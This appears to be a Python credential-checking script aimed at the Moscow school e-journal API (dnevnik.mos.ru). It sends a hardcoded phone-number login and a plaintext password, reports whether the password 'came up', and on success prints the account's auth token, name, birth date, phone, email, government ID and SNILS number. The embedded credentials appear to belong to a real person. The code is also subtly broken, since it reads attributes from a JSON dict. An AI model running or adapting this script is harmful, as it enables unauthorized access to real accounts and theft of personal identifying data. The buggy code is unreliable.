import requests
import os
import json
import random

res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
"login": '79651537853',
"password_plain": '1558@20072509kK'
})

print(res.text)

version = 1

if res.status_code != 200:
    if version == 1:
        print("[-] Пароль 1558@20072509kK не подходит!\n")
    else:
        print("[-] password 1558@20072509kK does not fit!\n")

elif res.status_code == 200:
    if version == 1:
        print("[+] Пароль 1558@20072509kK подошел!")
    else:
        print("[+] Passowrd 1558@20072509kK came up!")
    token = res.json().authentication_token
    date = res.json().date_of_birth
    first_name = res.json().first_name
    guid = res.json().guid
    email = res.json().email
    id = res.json().id
    last_name = res.json().last_name
    phone = res.json().phone_number
    sex = res.json().sex
    snils = res.json().snils 
    print("[+] Полученные данные:")
    print("Токен Авторизации: " + token)
    print("Имя: " + first_name + "  " + last_name)
    print("Пол: " + sex)
    print("Дата Рождения: " + date)
    print("Государственный ID: " + guid)
    print("Номер телефона: " + phone)
    print("Электронная почта: " + email)
    print("СНИЛС " + snils)